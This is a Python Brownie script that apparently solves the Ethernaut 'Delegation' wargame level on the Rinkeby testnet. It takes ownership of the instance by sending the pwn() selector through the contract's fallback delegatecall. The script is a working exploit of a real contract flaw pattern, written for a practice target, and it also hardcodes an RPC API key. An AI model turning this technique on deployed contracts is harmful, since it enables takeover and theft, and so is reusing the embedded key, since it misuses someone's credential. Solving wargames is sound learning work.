from brownie import accounts, config, Delegation
from web3 import Web3
import time

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x00f42E8C082507c30c5552Bed3d77C976Ee44781"
delegation = Delegation.at(instance_address)

# -----------------------------------------------------------
# the goal of this level is to claim ownership of the instance
# -----------------------------------------------------------


def level_completed():
    return delegation.owner() == account.address


def exploit():
    # set up web3
    w3 = Web3(
        Web3.HTTPProvider(
            "https://eth-rinkeby.alchemyapi.io/v2/WVudGvq89ALUL1MOaXahRdH0E4Yu9cys"
        )
    )

    # compute signature of "pwn()"
    sig_bytes = Web3.keccak(text="pwn()")
    sig = sig_bytes[:4]

    # send transaction with sig as argument
    private_key = config["wallets"]["from_key"]
    nonce = w3.eth.get_transaction_count(account.address)

    signed_txn = w3.eth.account.sign_transaction(
        dict(
            nonce=nonce,
            gas=100000,
            gasPrice=20000000000,
            to=delegation.address,
            value=0,
            data=sig,
            chainId=4,
        ),
        private_key,
    )
    tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    print(f"Sending transaction...")

    # wait for transaction to finish
    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction sent...")
    time.sleep(5)

    # confirm that we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
